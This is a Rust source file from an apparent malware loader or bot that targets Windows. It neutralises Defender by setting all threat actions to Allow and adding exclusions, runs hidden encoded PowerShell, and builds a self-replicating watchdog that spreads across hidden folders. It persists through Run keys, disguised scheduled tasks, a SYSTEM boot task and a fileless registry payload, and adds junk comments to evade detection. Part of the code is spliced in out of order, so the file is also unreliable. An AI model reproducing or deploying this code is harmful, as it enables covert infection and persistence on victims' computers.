use std::fs::File;
use std::io::Write;
use std::path::{Path, PathBuf};
use crate::config::constants::{get_bot_binary_name, get_persistence_script_name, get_launcher_script_name, CONFIG_FILENAME};

#[cfg(windows)]
use std::process::Command;

#[cfg(windows)]
fn run_encoded_ps(script: &str) -> std::io::Result<std::process::Output> {
    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
    // 1. Encode to UTF-16LE
    let mut utf16: Vec<u16> = script.encode_utf16().collect();
    // 2. Convert to Bytes (Little Endian)
    let mut bytes = Vec::new();
    for c in utf16 {
        bytes.push((c & 0xFF) as u8);
        bytes.push((c >> 8) as u8);
    }
    // 3. Base64 Encode
    let encoded = BASE64.encode(&bytes);

    Command::new("powershell.exe")
        .args(&["-WindowStyle", "Hidden", "-EncodedCommand", &encoded])
        .output()
}

#[cfg(windows)]
pub fn add_defender_exclusion(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    // Obfuscated Exclusion Add
    let script = format!(obfstr!("Add-MpPreference -ExclusionPath '{}' -Force"), path.display());
    let _ = run_encoded_ps(&script);
    Ok(())
}

#[cfg(windows)]
pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
    // Obfuscated Neutralization (Allow Threats = 6)
    // HighThreatDefaultAction = 6 (Allow)
    // SevereThreatDefaultAction = 6 (Allow)
    // Moderate... Low... = 6
    // Disable Sample Submission = 2
    let script = obfstr!(r#"
        Set-MpPreference -HighThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -Force;
        Set-MpPreference -SubmitSamplesConsent 2 -Force;
        Set-MpPreference -DisableRealtimeMonitoring $false; # Keep Realtime ON to appear normal, but actions are ALLOW
    "#);
    let _ = run_encoded_ps(script);
    Ok(())
}

#[cfg(not(windows))]
pub fn add_defender_exclusion(_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(not(windows))]
pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}


// Recovery Script removed. HTTP Fallback deprecated in favor of Tor Bootstrap.
fn get_recovery_script() -> String {
    String::new() 
}

pub fn create_watchdog_script(install_dirs: &[PathBuf], _config_path: &Path) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
    let dirs_ps: Vec<String> = install_dirs.iter()
        .map(|d| format!("'{}'", d.display()))
        .collect();
    let _dirs_array = dirs_ps.join(", ");

    let bot_binary_name = get_bot_binary_name();
    let monitor_name = get_persistence_script_name();
    let launcher_name_vbs = get_launcher_script_name();
    
    // Embed the recovery script content (now empty, logic preserved for structure)
    let recovery_payload_raw = get_recovery_script();
    let recovery_payload_escaped = recovery_payload_raw.replace("\"", "`\"");

    let node_script_content = format!(
        r#"
$ErrorActionPreference = "SilentlyContinue"
{junk1}

# --- CONSTANTS ---
$MY_DIR = $PSScriptRoot
$BOT_EXE = Join-Path $MY_DIR "{bot_binary_name}"
$CONFIG = Join-Path $MY_DIR "{config_name}"
$LAUNCHER_VBS = "{launcher_name_vbs}"
$SCRIPT_NAME = $MyInvocation.MyCommand.Name

# Registry Ledger Key
$REG_KEY = "HKCU:\Software\Microsoft\Windows\CurrentVersion\SystemChek"
$REG_VAL_NODES = "Nodes"
$REG_VAL_BLOB = "RecoveryBlob"

# Encoded Recovery Payload (Shared Prevention)
$RECOVERY_PAYLOAD = "{recovery_payload}"

# Polymorphic Resources
$POLY_NAMES = @("SysCache", "WinData", "NetConfig", "CloudSync", "SysDriver", "WinHost", "NetDriver", "SysService")
$POLY_PARENTS = @($env:USERPROFILE, "$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Music", "$env:USERPROFILE\\Pictures", "$env:USERPROFILE\\Videos", "$env:APPDATA", "$env:LOCALAPPDATA", "$env:TEMP")

# --- FUNCTIONS ---
{junk2}

function Get-Nodes {{
    if (-not (Test-Path $REG_KEY)) {{ return @($MY_DIR) }}
    $val = Get-ItemProperty -Path $REG_KEY -Name $REG_VAL_NODES -ErrorAction SilentlyContinue
    if ($val) {{
        return $val.$REG_VAL_NODES -split ";" | Where-Object {{ $_ -ne "" }}
    }}
    return @($MY_DIR)
}}

function Update-Nodes ($node_list) {{
    if (-not (Test-Path $REG_KEY)) {{ New-Item -Path $REG_KEY -Force | Out-Null }}
    $str = $node_list -join ";"
    Set-ItemProperty -Path $REG_KEY -Name $REG_VAL_NODES -Value $str
}}

function Spawn-Node {{
    $rnd_name = $POLY_NAMES | Get-Random
    $rnd_parent = $POLY_PARENTS | Get-Random
    $new_dir = Join-Path $rnd_parent $rnd_name
    while (Test-Path $new_dir) {{
        $rnd_name = $POLY_NAMES | Get-Random
        $new_dir = Join-Path $rnd_parent $rnd_name
    }}
    Copy-Item -Path $MY_DIR -Destination $new_dir -Recurse -Force
    $item = Get-Item -Path $new_dir -Force
    $item.Attributes = "Hidden, System, Directory"
    Get-ChildItem -Path $new_dir -Recurse | ForEach-Object {{ $_.Attributes = "Hidden, System" }}
    $launcher = Join-Path $new_dir $LAUNCHER_VBS
    $reg_run_name = "Win_" + $rnd_name + "_" + (Get-Random)
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $reg_run_name /t REG_SZ /d "wscript.exe `"$launcher`"" /f
    $vbs = Join-Path $new_dir $LAUNCHER_VBS
    wscript.exe "$vbs"
    return $new_dir
}}

function Ensure-Sleeper {{
    # SYMBIOTIC DEFENSE: Restore Deep Sleeper if missing
    
    # 1. Check Registry Blob
    $val = Get-ItemProperty -Path $REG_KEY -Name $REG_VAL_BLOB -ErrorAction SilentlyContinue
    if (-not $val) {{
        # Re-Encode and Write
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($RECOVERY_PAYLOAD)
        $encoded = [System.Convert]::ToBase64String($bytes)
        if (-not (Test-Path $REG_KEY)) {{ New-Item -Path $REG_KEY -Force | Out-Null }}
        Set-ItemProperty -Path $REG_KEY -Name $REG_VAL_BLOB -Value $encoded
    }}

    # 2. Check Scheduled Task
    $task = schtasks /query /TN "WindowsHealthUpdate" 2>$null
    if (-not $task) {{
        # Restore Task
        $task_cmd = "powershell.exe"
        $task_args = "-WindowStyle Hidden -Command `"IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty '$REG_KEY').$REG_VAL_BLOB)))`""
        schtasks /CREATE /TN "WindowsHealthUpdate" /TR "'$task_cmd' $task_args" /SC daily /ST 12:00 /F /RL HIGHEST | Out-Null
        schtasks /CREATE /TN "WindowsHealthMonitor" /TR "'$task_cmd' $task_args" /SC onlogon /F /RL HIGHEST | Out-Null
    }}
}}

function Self-Check {{
    $nodes = Get-Nodes
    if ($nodes -notcontains $MY_DIR) {{
        $nodes += $MY_DIR
        Update-Nodes $nodes
    }}
}}

function Perform-Mesh-Check {{
    $nodes = Get-Nodes
    $active_nodes = @()
    $updates_needed = $false
    foreach ($node in $nodes) {{
        if (Test-Path $node) {{
            $active_nodes += $node
        }} else {{
            $new_node = Spawn-Node
            $active_nodes += $new_node
            $updates_needed = $true
        }}
    }}
    if ($active_nodes.Count -lt 2) {{
        $new_node = Spawn-Node
        $active_nodes += $new_node
        $updates_needed = $true
    }}
    if ($updates_needed -or ($nodes.Count -ne $active_nodes.Count)) {{
        Update-Nodes $active_nodes
    }}
    return $active_nodes
}}

function Leader-Election ($nodes) {{
    $sorted = $nodes | Sort-Object
    if ($MY_DIR -eq $sorted[0]) {{ return $true }}
    return $false
}}

# Manage-Mining Removed. Bot is Loader only.

Self-Check
{junk3}
while ($true) {{
    Self-Check
    $nodes = Perform-Mesh-Check
    Ensure-Sleeper
    Start-Sleep -Seconds (10 + (Get-Random -Minimum 0 -Maximum 5))
}}
"#,
        bot_binary_name = bot_binary_name,
        config_name = CONFIG_FILENAME,
        launcher_name_vbs = launcher_name_vbs,
        recovery_payload = recovery_payload_escaped,
        junk1 = generate_junk_comment(),
        junk2 = generate_junk_comment(),
        junk3 = generate_junk_comment()
    );

    let mut vbs_paths = Vec::new();
// ... (rest of function) ...

// Helper for Script Obfuscation
fn generate_junk_comment() -> String {
    use rand::seq::SliceRandom;
    let words = vec![
        "System", "config", "Update", "Cache", "Driver", "Service", "Log", "Data", 
        "Network", "Host", "Local", "Global", "Internal", "External", "Proxy", 
        "Route", "Table", "Index", "Query", "Stack", "Heap", "Thread", "Pool"
    ];
    let mut rng = rand::thread_rng();
    let count = rand::random::<usize>() % 5 + 3; // 3 to 7 words
    let mut parts = Vec::new();
    for _ in 0..count {
        if let Some(w) = words.choose(&mut rng) {
            parts.push(*w);
        }
    }
    format!("# {}", parts.join(" "))
}
    for dir in install_dirs {
        if !dir.exists() { continue; }
        let monitor_path = dir.join(&monitor_name);
        
        let mut f = File::create(&monitor_path)?;
        f.write_all(node_script_content.as_bytes())?;

        let vbs_code = format!(
            r#"Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""{}""", 0, False
Set WshShell = Nothing
"#,
            monitor_path.display()
        );
        let vbs_path = dir.join(&launcher_name_vbs);
        let mut f = File::create(&vbs_path)?;
        f.write_all(vbs_code.as_bytes())?;
        vbs_paths.push(vbs_path);
    }
    Ok(vbs_paths)
}


#[cfg(windows)]
pub fn start_hidden(vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Command::new("wscript.exe")
        .arg(vbs_path)
        .spawn()?;
    Ok(())
}

#[cfg(not(windows))]
pub fn start_hidden(_vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn create_system_supervisor() -> Result<(), Box<dyn std::error::Error>> {
    // SYSTEM SUPERVISOR SERVICE
    // 1. Target Location: C:\ProgramData\WindowsHealth (Hidden/System)
    // 2. Privilege: NT AUTHORITY\SYSTEM
    // 3. Trigger: ONSTART (Boot)
    
    let program_data = std::env::var("ProgramData").unwrap_or("C:\\ProgramData".to_string());
    let target_dir = PathBuf::from(program_data).join("WindowsHealth");
    let target_exe = target_dir.join("sys_diag.exe");

    if !target_dir.exists() {
        fs::create_dir_all(&target_dir)?;
    }

    // Copy Self
    if let Ok(current_exe) = std::env::current_exe() {
        let _ = fs::copy(current_exe, &target_exe);
    }

    // Hide Directory
    let _ = Command::new("attrib")
        .args(&["+h", "+s", &target_dir.display().to_string()])
        .output();
        
    // Register Task (SYSTEM Privileges)
    // /SC ONSTART runs as soon as the system boots, before user login.
    // /RU SYSTEM runs as Local System.
    let _ = Command::new("schtasks")
        .args(&[
            "/CREATE", 
            "/TN", "WindowsSystemDiagnostics", 
            "/TR", &format!("'{}'", target_exe.display()), 
            "/SC", "ONSTART", 
            "/RU", "SYSTEM",
            "/F", 
            "/RL", "HIGHEST" 
        ])
        .output();

    Ok(())
}

#[cfg(not(windows))]
pub fn create_system_supervisor() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn create_fileless_sleeper() -> Result<(), Box<dyn std::error::Error>> {
    // 1. The Recovery Script (PowerShell)
    // We get the shared recovery script from the helper
    let recovery_script = get_recovery_script();

    // 2. Base64 Encode
    // Write script to temp file, have PS read->encode->reg write->delete file.
    let staging_dir = std::env::temp_dir().join("sys_recovery_staging.ps1");
    let mut f = File::create(&staging_dir)?;
    f.write_all(recovery_script.as_bytes())?;
    
    let ps_cmd = format!(
        r#"$script = Get-Content -Path '{}' -Raw; $bytes = [System.Text.Encoding]::Unicode.GetBytes($script); $encoded = [System.Convert]::ToBase64String($bytes); New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\SystemChek' -Force | Out-Null; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\SystemChek' -Name 'RecoveryBlob' -Value $encoded; Remove-Item -Path '{}' -Force"#,
        staging_dir.display(),
        staging_dir.display()
    );

    let _ = Command::new("powershell.exe")
        .args(&["-Command", &ps_cmd])
        .output();

    // 3. Register Scheduled Task (Fileless Trigger)
    let task_cmd = "powershell.exe";
    let task_args = r#"-WindowStyle Hidden -Command "IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\SystemChek').RecoveryBlob)))""#;
    
    // Create Task via schtasks
    let _ = Command::new("schtasks")
        .args(&[
            "/CREATE", 
            "/TN", "WindowsHealthUpdate", 
            "/TR", &format!("'{}' {}", task_cmd, task_args), 
            "/SC", "daily", 
            "/ST", "12:00",
            "/F", // Force
            "/RL", "HIGHEST"
        ])
        .output();
        
    // Also Add ONLOGON trigger
    let _ = Command::new("schtasks")
        .args(&[
            "/CREATE", 
            "/TN", "WindowsHealthMonitor", 
            "/TR", &format!("'{}' {}", task_cmd, task_args), 
            "/SC", "onlogon", 
            "/F",
            "/RL", "HIGHEST"
        ])
        .output();

    Ok(())
}

#[cfg(not(windows))]
pub fn create_fileless_sleeper() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn hide_console() {
    unsafe {
        use winapi::um::wincon::GetConsoleWindow;
        use winapi::um::winuser::{ShowWindow, SW_HIDE};
        let window = GetConsoleWindow();
        if !window.is_null() {
            ShowWindow(window, SW_HIDE);
        }
    }
}

#[cfg(not(windows))]
pub fn hide_console() {}
